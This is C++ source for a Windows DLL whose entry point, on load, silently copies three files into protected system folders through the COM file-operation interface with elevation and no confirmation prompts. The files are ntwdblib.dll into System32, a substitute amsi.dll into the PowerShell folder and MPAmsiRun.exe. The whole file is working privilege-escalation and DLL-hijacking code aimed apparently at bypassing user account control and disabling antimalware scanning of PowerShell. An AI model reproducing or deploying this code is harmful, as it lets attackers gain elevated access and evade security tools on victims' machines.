#include "stdafx.h"
#include <string>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
	LPCWSTR dllName = L"ntwdblib.dll";
	LPCWSTR AmsidllName = L"amsi.dll";
	LPCWSTR AmsiShell = L"MPAmsiRun.exe";
	switch (ul_reason_for_call) {
	case DLL_PROCESS_ATTACH: {
		IFileOperation *fileOperation = NULL;
		wchar_t dllPath[1024];
		GetModuleFileName(hModule, dllPath, 1024);
		std::wstring path(dllPath);
		const size_t last = path.rfind('\\');

		if (std::wstring::npos != last)
		{
			path = path.substr(0, last + 1);
		}
		path += dllName;
		LPCWSTR destPath = L"C:\\windows\\System32";
		HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE);
		if (SUCCEEDED(hr)) {
			hr = CoCreateInstance(CLSID_FileOperation, NULL, CLSCTX_ALL, IID_PPV_ARGS(&fileOperation));
			if (SUCCEEDED(hr)) {
				hr = fileOperation->SetOperationFlags(
					FOF_NOCONFIRMATION |
					FOF_SILENT |
					FOFX_SHOWELEVATIONPROMPT |
					FOFX_NOCOPYHOOKS |
					FOFX_REQUIREELEVATION |
					FOF_NOERRORUI);
				if (SUCCEEDED(hr)) {
					IShellItem *from = NULL, *to = NULL;
					hr = SHCreateItemFromParsingName(path.data(), NULL, IID_PPV_ARGS(&from));
					if (SUCCEEDED(hr)) {
						if (destPath)
							hr = SHCreateItemFromParsingName(destPath, NULL, IID_PPV_ARGS(&to));
						if (SUCCEEDED(hr)) {
							hr = fileOperation->CopyItem(from, to, dllName, NULL);
							if (NULL != to)
								to->Release();
						}
						from->Release();
					}
					if (SUCCEEDED(hr)) {
						hr = fileOperation->PerformOperations();
					}
				}
				fileOperation->Release();
			}
			CoUninitialize();
		}

		if (std::wstring::npos != last)
		{
			path = path.substr(0, last + 1);
		}
		path += AmsidllName;
		LPCWSTR AmsidestPath = L"C:\\Windows\\System32\\WindowsPowerShell\\v1.0";
		if (SUCCEEDED(hr)) {
			hr = CoCreateInstance(CLSID_FileOperation, NULL, CLSCTX_ALL, IID_PPV_ARGS(&fileOperation));
			if (SUCCEEDED(hr)) {
				hr = fileOperation->SetOperationFlags(
					FOF_NOCONFIRMATION |
					FOF_SILENT |
					FOFX_SHOWELEVATIONPROMPT |
					FOFX_NOCOPYHOOKS |
					FOFX_REQUIREELEVATION |
					FOF_NOERRORUI);
				if (SUCCEEDED(hr)) {
					IShellItem *from = NULL, *to = NULL;
					hr = SHCreateItemFromParsingName(path.data(), NULL, IID_PPV_ARGS(&from));
					if (SUCCEEDED(hr)) {
						if (AmsidestPath)
							hr = SHCreateItemFromParsingName(AmsidestPath, NULL, IID_PPV_ARGS(&to));
						if (SUCCEEDED(hr)) {
							hr = fileOperation->CopyItem(from, to, AmsidllName, NULL);
							if (NULL != to)
								to->Release();
						}
						from->Release();
					}
					if (SUCCEEDED(hr)) {
						hr = fileOperation->PerformOperations();
					}
				}
				fileOperation->Release();
			}
			CoUninitialize();
		}

		if (std::wstring::npos != last)
		{
			path = path.substr(0, last + 1);
		}
		path += AmsiShell;
		if (SUCCEEDED(hr)) {
			hr = CoCreateInstance(CLSID_FileOperation, NULL, CLSCTX_ALL, IID_PPV_ARGS(&fileOperation));
			if (SUCCEEDED(hr)) {
				hr = fileOperation->SetOperationFlags(
					FOF_NOCONFIRMATION |
					FOF_SILENT |
					FOFX_SHOWELEVATIONPROMPT |
					FOFX_NOCOPYHOOKS |
					FOFX_REQUIREELEVATION |
					FOF_NOERRORUI);
				if (SUCCEEDED(hr)) {
					IShellItem *from = NULL, *to = NULL;
					hr = SHCreateItemFromParsingName(path.data(), NULL, IID_PPV_ARGS(&from));
					if (SUCCEEDED(hr)) {
						if (destPath)
							hr = SHCreateItemFromParsingName(destPath, NULL, IID_PPV_ARGS(&to));
						if (SUCCEEDED(hr)) {
							hr = fileOperation->CopyItem(from, to, AmsiShell, NULL);
							if (NULL != to)
								to->Release();
						}
						from->Release();
					}
					if (SUCCEEDED(hr)) {
						hr = fileOperation->PerformOperations();
					}
				}
				fileOperation->Release();
			}
			CoUninitialize();
		}

	}
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}

